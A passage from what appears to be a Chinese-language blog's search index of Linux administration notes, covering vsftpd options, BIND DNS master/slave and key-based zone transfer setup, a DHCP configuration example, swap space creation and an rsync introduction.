&#x6240;&#x6709;&#x533F;&#x540D;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x6240;&#x6709;&#x6743;&#x90FD;&#x5C06;&#x66F4;&#x6539;&#x4E3A;chown_username&#x9009;&#x9879;&#x6307;&#x5B9A;&#x7684;&#x7528;&#x6237;&#x3002; chroot_list_enable# &#x53EA;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x76EE;&#x5F55;&#x3002;# &#x5982;&#x679C;&#x542F;&#x7528;chroot_local_user&#xFF0C;&#x4E0E;&#x4E0A;&#x8FF0;&#x76F8;&#x53CD; chroot_local_user# &#x672C;&#x5730;&#x7528;&#x6237;&#x767B;&#x5F55;&#x540E;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x4E3B;&#x76EE;&#x5F55; connect_from_port_20# &#x63A7;&#x5236;&#x7AEF;&#x53E3;&#x6570;&#x636E;&#x8FDE;&#x63A5;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x7AEF;&#x53E3;ftp&#x3002; debug_ssl# OpenSSL&#x8FDE;&#x63A5;&#x8BCA;&#x65AD;&#x5C06;&#x8F6C;&#x5B58;&#x5230;vsftpd&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002; delete_failed_uploads# &#x5220;&#x9664;&#x4EFB;&#x4F55;&#x5931;&#x8D25;&#x7684;&#x4E0A;&#x4F20;&#x6587;&#x4EF6; deny_email_enable# &#x5982;&#x679C;&#x6FC0;&#x6D3B;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x5BFC;&#x81F4;&#x767B;&#x5F55;&#x88AB;&#x62D2;&#x7EDD;&#x7684;&#x533F;&#x540D;&#x5BC6;&#x7801;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x54CD;&#x5E94;&#x5217;&#x8868;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5305;&#x542B;&#x6B64;&#x5217;&#x8868;&#x7684;&#x6587;&#x4EF6;&#x662F; /etc/vsftpd.banned_emails&#xFF0C;&#x4F46;&#x60A8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;banned_email_file &#x8BBE;&#x7F6E;&#x8986;&#x76D6;&#x5B83; &#x3002; dirlist_enable# &#x6240;&#x6709;&#x76EE;&#x5F55;&#x5217;&#x8868;&#x547D;&#x4EE4;&#x90FD;&#x5C06;&#x62D2;&#x7EDD;&#x6388;&#x6743;&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES dirmessage_enable# &#x7528;&#x6237;&#x5728;&#x4ED6;&#x4EEC;&#x7B2C;&#x4E00;&#x6B21;&#x8FDB;&#x5165;&#x65B0;&#x76EE;&#x5F55;&#x65F6;&#x770B;&#x5230;&#x6D88;&#x606F;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x626B;&#x63CF;&#x76EE;&#x5F55;&#x4E2D;&#x7684;.message&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;message_file&#x4FEE;&#x6539; download_enable# &#x5141;&#x8BB8;&#x4E0B;&#x8F7D;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;NO&#xFF0C;&#x6240;&#x6709;&#x4E0B;&#x8F7D;&#x8BF7;&#x6C42;&#x90FD;&#x5C06;&#x88AB;&#x62D2;&#x7EDD;&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES dual_log_enable# &#x53CC;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;&#x542F;&#x7528;&#x5C06;&#x751F;&#x6210; /var/log/xferlog &#x548C; /var/log/vsftpd.log&#x3002;&#x524D;&#x8005;&#x662F;wu-ftpd&#x98CE;&#x683C;&#x7684;&#x4F20;&#x8F93;&#x65E5;&#x5FD7;&#xFF0C;&#x53EF;&#x7531;&#x6807;&#x51C6;&#x5DE5;&#x5177;&#x89E3;&#x6790;&#x3002;&#x540E;&#x8005;&#x662F;vsftpd&#x7684;&#x98CE;&#x683C;&#x65E5;&#x5FD7;&#x3002; force_dot_files# force_anon_data_sslforce_local_logins_sslguest_enablehide_idsimplicit_ssllistenlisten_ipv6local_enablelock_upload_fileslog_ftp_protocolls_recurse_enablemdtm_writeno_anon_passwordno_log_lockone_process_modelpasswd_chroot_enablepasv_addr_resolvpasv_enablepasv_promiscuousport_enableport_promiscuousrequire_certrequire_ssl_reuserun_as_launching_usersecure_email_list_enablesession_supportsetproctitle_enablessl_enablessl_request_certssl_sslv2ssl_sslv3ssl_tlsv1strict_ssl_read_eofstrict_ssl_write_shutdownsyslog_enabletcp_wrapperstext_userdb_namestilde_user_enableuse_localtimeuse_sendfileuserlist_denyuserlist_enablecalidate_certvirtual_use_local_privswrite_enablexferlog_enablexferlog_std_format &#x6570;&#x503C;&#x9009;&#x9879;accept_timeoutanon_max_rateanon_umaskchown_upload_modeconnect_timeoutdata_connection_timeoutdelay_failed_logindelay_successful_loginfile_open_modeftp_data_portidle_session_timeoutlisten_portlocal_max_ratelocal_umaskmax_clientsmax_login_failsmax_per_ippasv_max_portpasv_min_porttrans_chunk_size &#x5B57;&#x7B26;&#x4E32;&#x9009;&#x9879;anon_rootbanned_email_filebanner_fileca_certs_filechown_usernamechroot_list_filecmds_allowedcmds_denieddeny_filedsa_cert_filedsa_private_key_fileemail_password_fileftp_usernameftpd_bannerguest_usernamehide_filelisten_addresslisten_address6local_rootmessage_filenopriv_userpam_service_namepasv_addressrsa_cert_filersa_private_key_filesecure_chroot_dirssl_ciphersuser_config_diruser_sub_tokenuserlist_filevsftpd_log_filexferlog_file document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"DNS Server的配置与管理","date":"2022-06-07T04:35:39.000Z","path":"/posts/4782a8c2/","text":"&#x914D;&#x7F6E;&#x5B9E;&#x73B0; &#x4FEE;&#x6539;/etc/named.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6; 1234567891011121314151617181920212223242526options { listen-on port 53 { any; }; listen-on-v6 port 53 { any; }; ... allow-query { any; }; ... recursion yes; # &#x662F;&#x5426;&#x542F;&#x7528;&#x9012;&#x5F52;&#x67E5;&#x8BE2; dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto;}...##------------------------------------------------## &#x8BE5;&#x914D;&#x7F6E;&#x5EFA;&#x8BAE;&#x6DFB;&#x52A0;&#x5230;/etc//etc/named.rfc1912.zones# &#x65B0;&#x589E;&#x5982;&#x4E0B;zone &quot;abc.cn&quot; IN { type master; file &quot;abc.cn.zone&quot;;};zone &quot;73.168.192.in-addr.arpa&quot; IN { type master; file &quot;192.168.73.arpa&quot;;}; &#x6DFB;&#x52A0;&#x6B63;&#x53CD;&#x5411;&#x89E3;&#x6790;1234567# &#x590D;&#x5236;&#x6B63;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;&#x6A21;&#x677F;cp -p /var/named/named.localhost /var/named/abc.cn.zone# &#x590D;&#x5236;&#x53CD;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;&#x6A21;&#x677F;cp -p /var/named/named.empty /var/named/192.168.73.arpa############################################### &#x6DFB;&#x52A0;&#x6B63;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;vim /var/named/abc.cn.zone 1234567891011121314151617181920212223242526$TTL 1Dabc.cn. IN SOA dns.abc.cn. root.abc.cn. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimumabc.cn. NS dns.abc.cn.dns.abc.cn. A 192.168.73.5www.abc.cn. A 192.168.73.5www1.abc.cn. CNAME www.abc.cn.# &#x6DFB;&#x52A0;&#x53CD;&#x5411;&#x89E3;&#x6790;&#x914D;&#x7F6E;vim /var/named/192.168.73.arpa$TTL 3H@ IN SOA abc.cn. root.abc.cn. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS ns.abc.cn.ns A 192.168.73.55 PTR ns.abc.cn.5 PTR www.abc.cn. &#x914D;&#x7F6E;DNS&#x8F6C;&#x53D1;12345678910111213vim /etc/named.conf################options{ forward first; # &#x591A;&#x4E2A;DNS&#x7528;;&#x9694;&#x5F00; forwarders { 192.168.73.2; 114.114.114.114; 8.8.8.8; 8.8.4.4; 1.1.1.1; };} &#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#x670D;&#x52A1; &#x4E3B;&#x4ECE;&#x673A;&#x5668;&#x8FDB;&#x884C;&#x65F6;&#x95F4;&#x540C;&#x6B65; 1ntpd &#x4FEE;&#x6539;&#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;12345678910111213vim /etc/named.conf###################zone &quot;abc.cn&quot; IN { type master; file &quot;abc.cn.zone&quot;; allow-transfer { 192.168.73/24; }; # &#x6DFB;&#x52A0;&#x8BE5;&#x53C2;&#x6570;};zone &quot;73.168.192.in-addr.arpa&quot; IN { type master; file &quot;192.168.73.arpa&quot;; allow-transfer { 192.168.73/24; }; # &#x6DFB;&#x52A0;&#x8BE5;&#x53C2;&#x6570;}; &#x4FEE;&#x6539;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E; 12345678910111213141516171819202122232425vim /etc/named.confoptions{ listen-on port 53 { any; }; listen-on-v6 port 53 { any; }; ... allow-query { any; }; recursion yes; ... ... dnssec-validation no;}zone &quot;abc.cn&quot; IN { type slave; file &quot;slaves/abc.cn.zone.file&quot;; masters { 192.168.73.5; };};zone &quot;73.168.192.in-addr.arpa&quot; IN { type slave; file &quot;slaves/192.168.73.arpa.file&quot;; masters { 192.168.73.5; };}; &#x91CD;&#x542F;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x67E5;&#x770B;/var/named/slaves/&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECE;DNS&#x670D;&#x52A1;&#x80FD;&#x591F;&#x4ECE;&#x4E3B;DNS&#x590D;&#x5236;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8FC7;&#x6765; DNS&#x4E3B;&#x4ECE;&#x5BC6;&#x94A5;&#x8BA4;&#x8BC1; ntpd&#x4E3B;&#x4ECE;&#x65F6;&#x95F4;&#x540C;&#x6B65; &#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;12345678910111213141516171819202122232425262728# &#x751F;&#x6210;&#x5BC6;&#x94A5;cd /var/named/chroot/etc/dnssec-keygen -a hmac-md5 -b 128 -n HOST &#x5BC6;&#x94A5;&#x540D;&#x79F0;# &#x67E5;&#x770B;&#x5BC6;&#x94A5;&#x7684;&#x5BC6;&#x7801;cat k****.+**+***.keycat Kdnskey.+157+23495.keydnskey. IN KEY 512 3 157 Rg0mKvMMQ06YAoN0FcOCXQ==&#x590D;&#x5236;&#x5BC6;&#x7801;&#x4E32;######################################### &#x4FEE;&#x6539;&#x4E3B;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;vim /etc/named.conf# &#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;key &quot;dnskey&quot; { algorithm hmac-md5; secret &quot;&#x7C98;&#x8D34;&#x751F;&#x6210;&#x7684;key&#x5BC6;&#x7801;&#x4E32;&quot;;};zone &quot;abc.cn&quot; IN { type master; file &quot;abc.cn.zone&quot;; allow-transfer { key &#x5BC6;&#x94A5;&#x540D;&#x79F0; };};zone &quot;73.168.192.in-addr.arpa&quot; IN { type master; file &quot;192.168.73.apra&quot;; allow-transfer { key &#x5BC6;&#x94A5;&#x540D;&#x79F0; };}; &#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;12345678910111213141516171819# &#x4FEE;&#x6539;dns&#x914D;&#x7F6E;&#x6587;&#x4EF6;vim /etc/named.conf# &#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x914D;&#x7F6E;key &quot;dnskey&quot; { algorithm hmac-md5; secret &quot;&#x7C98;&#x8D34;&#x751F;&#x6210;&#x7684;&#x5BC6;&#x94A5;&#x5230;&#x8BE5;&#x5904;&quot;;};zone &quot;abc.cn&quot; IN { type slave; file &quot;slaves/abc.cn.zone.file&quot;; masters { 192.168.73.5 key dnskey; };};zone &quot;73.168.192.in-addr.arpa&quot; IN { type slave; file &quot;slaves/192.168.73.arpa.file&quot;; masters { 192.168.73.5 key dnskey; };}; &#x5E38;&#x89C1;&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x542F;&#x52A8;&#x72B6;&#x6001;&#x62A5;network unreachable&#x95EE;&#x9898;1234567891011121314Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;./DNSKEY/IN&apos;: 2001:503:ba3e::2:30#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;./NS/IN&apos;: 2001:503:ba3e::2:30#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:500:48::1#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:4f8:0:2::19#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:2f::f#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:500:2f::f#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:1::803f:235#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:500:1::803f:235#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:503:c27::2:30#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/AAAA/IN&apos;: 2001:503:c27::2:30#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns.isc.afilias-nst.info/A/IN&apos;: 2001:500:1a::1#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:4f8:0:2::20#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;dlv.isc.org/DNSKEY/IN&apos;: 2001:500:60::29#53Oct 23 11:39:03 server named[1585]: error (network unreachable) resolving &apos;ns1.isc.ultradns.net/A/IN&apos;: 2001:7fd::1#53 &#x914D;&#x7F6E;&#x9012;&#x5F52;&#x65F6;&#xFF0C;&#x8F6C;&#x53D1;&#x6570;&#x636E;&#x4F18;&#x5148;IPv6&#x8FED;&#x4EE3; &#x4FEE;&#x6539;/etc/sysconfig/named123456# &#x6DFB;&#x52A0;OPTIONS#/etc/sysconfig/named &#x662F;bind&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x65F6;&#x4F20;&#x9012;&#x53C2;&#x6570;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;OPTIONS=&quot;-4&quot;# BIND named process options# ~~~~~~~~~~~~~~~~~~~~~~~~~~ &#x53C2;&#x8003;&#xFF1A;https://www.cnblogs.com/zy09/p/14596993.html &#x914D;&#x7F6E;&#x4E3B;&#x4ECE;DNS&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x65E0;&#x6CD5;&#x8BFB;&#x53D6;&#x4ECE;DNS&#x914D;&#x7F6E; &#x4FEE;&#x6539;&#x4ECE;DNS&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x6587;&#x4EF6;123vim /etc/named.confdnssec-enable yes; dnssec-validation no; #&#x5173;&#x95ED;&#x9A8C;&#x8BC1; DNS&#x914D;&#x7F6E;&#x89E3;&#x6790; An example of a simple resource record (RR):example.com. 86400 IN A 192.0.2.1 example.com, &#x8D44;&#x6E90;&#x8BB0;&#x5F55;86400, time to live(TTL)IN &#x201C;the Internet system&#x201D;, &#x6307;&#x660E;RR&#x7684;&#x7684;&#x7C7B;&#x522B;A &#x6307;&#x660E;RR&#x7684;&#x7C7B;&#x578B;&#xFF0C;a host address192.0.2.1 &#x6307;&#x660E;RR&#x5305;&#x542B;&#x7684;IP&#x5730;&#x5740; /etc/named.conf&#xFF0C;bind&#x7684;&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/var/named/&#xFF0C;&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x8F85;&#x52A9;&#x76EE;&#x5F55; SOA &#xFF0C;Start of Authority Record&#xFF0C;&#x8D77;&#x59CB;&#x6388;&#x6743;&#x8BB0;&#x5F55;&#xFF0C;&#x6BCF;&#x4E2A;&#x533A;&#x5728;&#x533A;&#x7684;&#x5F00;&#x59CB;&#x90FD;&#x5305;&#x542B;&#x4E00;&#x4E2A;NS&#xFF0C;Name Server&#xFF0C;&#x57DF;&#x540D;&#x670D;&#x52A1;&#x5668;&#x8BB0;&#x5F55;&#xFF0C;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x8BE5;&#x57DF;&#x540D;&#x7531;&#x54EA;&#x4E2A;DNS&#x670D;&#x52A1;&#x5668;&#x6765;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x6BCF;&#x4E2A;&#x533A;&#x81F3;&#x5C11;&#x5305;&#x542B;&#x4E00;&#x4E2A;NSA&#xFF0C;&#x5730;&#x5740;&#x8D44;&#x6E90;&#x8BB0;&#x5F55;&#xFF0C;&#x628A;FQDN&#xFF08;&#x5B8C;&#x5168;&#x5408;&#x683C;&#x57DF;&#x540D;&#xFF0C;&#x6216;&#x5B8C;&#x6574;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x540D;&#xFF09;&#x6620;&#x5C04;&#x5230;IP&#x5730;&#x5740;&#xFF0C;&#x8BE5;&#x8BB0;&#x5F55;&#x80FD;&#x591F;&#x89E3;&#x6790;FQDN&#x57DF;&#x540D;&#x5BF9;&#x5E94;&#x7684;IP&#x5730;&#x5740;&#x3002;PTR&#xFF0C;&#x6307;&#x9488;&#x8BB0;&#x5F55;&#xFF0C;&#x628A;IP&#x5730;&#x5740;&#x6620;&#x5C04;&#x5230;FQDN&#xFF0C;&#x7528;&#x4E8E;&#x53CD;&#x5411;&#x67E5;&#x8BE2;&#xFF0C;&#x901A;&#x8FC7;IP&#x5730;&#x5740;&#x627E;&#x5230;&#x57DF;&#x540D;&#x3002;CNAME&#xFF0C;&#x522B;&#x540D;&#x8BB0;&#x5F55;&#xFF0C;&#x521B;&#x5EFA;&#x7279;&#x5B9A;&#x7684;FQDN&#x522B;&#x540D;MX&#xFF0C;&#x90AE;&#x4EF6;&#x4EA4;&#x6362;&#x8BB0;&#x5F55;&#xFF0C;&#x6307;&#x5B9A;&#x90AE;&#x4EF6;&#x4EA4;&#x6362;&#x670D;&#x52A1;&#x5668;&#x3002; /etc/named.conf&#x5E38;&#x7528;&#x914D;&#x7F6E;&#x9009;&#x9879; Option Description allow-query allow-query-cache blackhole directory disable-empty-zone dnssec-enable dnssec-validation empty-zones-enable forwarders forward listen-on listen-on-v6 max-cache-size notify pid-file recursion statistics-file document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"DHCP Server的配置与管理","date":"2022-06-07T04:34:55.000Z","path":"/posts/9964b559/","text":"&#x5B89;&#x88C5;&#x914D;&#x7F6E;12#rhel/centosyum install -y dhcp /etc/dhcp/dhcpd.confDHCP&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x76EE;&#x5F55;/usr/share/doc/dhcp*/dhcpd.conf.sampleDHCP&#x914D;&#x7F6E;&#x6A21;&#x677F;/var/lib/dhcpd/dhcpd.leases dhcp&#x79DF;&#x7EA6;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4FDD;&#x5B58;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x79DF;&#x7EA6;&#x58F0;&#x660E;&#xFF0C;&#x5305;&#x542B;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x3001;MAC&#x5730;&#x5740;&#x3001;&#x5206;&#x914D;&#x7684;IP&#x5730;&#x5740;&#x7B49;&#x3002; &#x914D;&#x7F6E;&#x793A;&#x4F8B;1234567891011121314151617181920212223242526272829vim /etc/dhcp/dhcpd.conf######################### &#x58F0;&#x660E;&#x4E00;&#x4E2A;&#x6BB5;&#xFF1A;subnet 192.168.1.0 netmask 255.255.255.0 { # &#x5730;&#x5740;&#x6C60;IP&#x5730;&#x5740;&#x8303;&#x56F4; range 192.168.1.10 192.168.1.50; # &#x5BA2;&#x6237;&#x7AEF;&#x6307;&#x5B9A;DNS&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#xFF1A; #option domain-name-servers ns1.internal.example.org; # &#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x6307;&#x5B9A;&#x6240;&#x5C5E;&#x7684;&#x57DF;&#xFF1A; #option domain-name &quot;internal.example.org&quot;; # &#x9ED8;&#x8BA4;&#x7F51;&#x5173;/&#x8DEF;&#x7531; option routers 192.168.1.1; # &#x5E7F;&#x64AD;&#x5730;&#x5740; option broadcast-address 192.168.1.255; # &#x5B9A;&#x4E49;IP&#x9ED8;&#x8BA4;&#x79DF;&#x7EA6;&#x65F6;&#x95F4;&#xFF0C;&#xFF08;&#x5355;&#x4F4D;&#xFF1A;s/&#x79D2;&#xFF09;&#xFF1A; default-lease-time 600; # &#x5B9A;&#x4E49;IP&#x6700;&#x5927;&#x79DF;&#x7EA6;&#x65F6;&#x957F;&#xFF0C;&#xFF08;&#x5355;&#x4F4D;&#xFF1A;s/&#x79D2;&#xFF09;&#xFF1A; max-lease-time 7200; # &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x7C7B;&#x578B; log-facility local7; # IP&#x5730;&#x5740;&#x7ED1;&#x5B9A;&#xFF1A; # &#x6307;&#x5B9A;&#x4E00;&#x4E2A;IP&#x5730;&#x5740;&#x7ED9;&#x6307;&#x5B9A;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x6307;&#x5B9A;&#x7684;&#x5730;&#x5740;&#x4E0D;&#x53EF;&#x4EE5;&#x4E0D;&#x5728;&#x5730;&#x5740;&#x6C60;&#x8303;&#x56F4;&#x5185; host localhost { # &#x5BA2;&#x6237;&#x7AEF;&#x7684;MAC&#x5730;&#x5740; hardware ethernet 00:0c:29:10:d9:56; # &#x6307;&#x5B9A;&#x7684;IP&#x7ED9;&#x5BA2;&#x6237;&#x7AEF; fixed-address 192.168.1.11; }} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"根分区扩容","date":"2022-06-07T04:33:22.000Z","path":"/posts/f0a65eeb/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"swap交换分区","date":"2022-06-07T04:32:42.000Z","path":"/posts/37ca92de/","text":"&#x6269;&#x5C55;&#x4EA4;&#x6362;&#x5206;&#x533A;&#x65B9;&#x6CD5;&#x4E00;&#xFF1A;&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x5206;&#x533A; &#x4F7F;&#x7528;fdisk/gdisk&#x7B49;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;mkswap&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x5206;&#x533A; 12345678910111213141516fdisk /dev/sdbn...+1G...w# &#x8BBE;&#x7F6E;&#x4EA4;&#x6362;&#x5206;&#x533A;mkswap /dev/sdb1# &#x542F;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;swapon /dev/sdb1# &#x5F00;&#x673A;&#x6302;&#x8F7D;vim /etc/fstab#&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570;/dev/sdb1 swap swap defaults 0 0 &#x65B9;&#x6CD5;&#x4E8C;&#xFF1A;&#x521B;&#x5EFA;&#x4EA4;&#x6362;&#x6587;&#x4EF6;123456789101112# &#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;512MB&#x5927;&#x5C0F;&#x7684;&#x6587;&#x4EF6;&#x4E3A;&#x4F8B;&#xFF1A;dd if=/dev/zero of=/swapfile bs=1024 count=524288# &#x521B;&#x5EFA;swap&#x683C;&#x5F0F;&#x6587;&#x4EF6;mkswap /swapfile# &#x542F;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;swapon /swapfile# &#x5F00;&#x673A;&#x6302;&#x8F7D;vim /etc/fstab/swapfile swap swap defaults 0 0 &#x5220;&#x9664;&#x4EA4;&#x6362;&#x7A7A;&#x95F4;123# &#x7981;&#x7528;&#x4EA4;&#x6362;&#x5206;&#x533A;/&#x4EA4;&#x6362;&#x6587;&#x4EF6;swapoff /dev/sdb1#swapoff /swapfile &#x4ECE;/etc/fstab&#x5220;&#x9664;swap&#x9879;&#x76EE;&#xFF0C;&#x4F7F;&#x7528;fdisk&#x6216;yast&#x5DE5;&#x5177;&#x5220;&#x9664;&#x5206;&#x533A; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx访问控制","date":"2022-06-03T04:38:08.000Z","path":"/posts/d4e5e907/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx日志管理","date":"2022-06-02T02:29:20.000Z","path":"/posts/2793eb31/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"rsync数据同步","date":"2022-05-03T14:16:38.000Z","path":"/posts/3c7a2415/","text":"rsync&#x57FA;&#x7840;rsync&#x547D;&#x4EE4; &#x662F;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x540C;&#x6B65;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;LAN/WAN&#x5FEB;&#x901F;&#x540C;&#x6B65;&#x591A;&#x53F0;&#x4E3B;&#x673A;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#x3002;rsync&#x4F7F;&#x7528;&#x6240;&#x8C13;&#x7684;&#x201C;rsync&#x7B97;&#x6CD5;&#x201D;&#x6765;&#x4F7F;&#x672C;&#x5730;&#x548C;&#x8FDC;&#x7A0B;&#x4E24;&#x4E2A;&#x4E3B;&#x673A;&#x4E4B;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#x8FBE;&#x5230;&#x540C;&#x6B65;&#xFF0C;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x53EA;&#x4F20;&#x9001;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4E0D;&#x540C;&#x90E8;&#x5206;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x6B21;&#x90FD;&#x6574;&#x4EFD;&#x4F20;&#x9001;&#xFF0C;&#x56E0;&#x6B64;&#x901F;&#x5EA6;&#x76F8;&#x5F53;&#x5FEB;&#x3002; 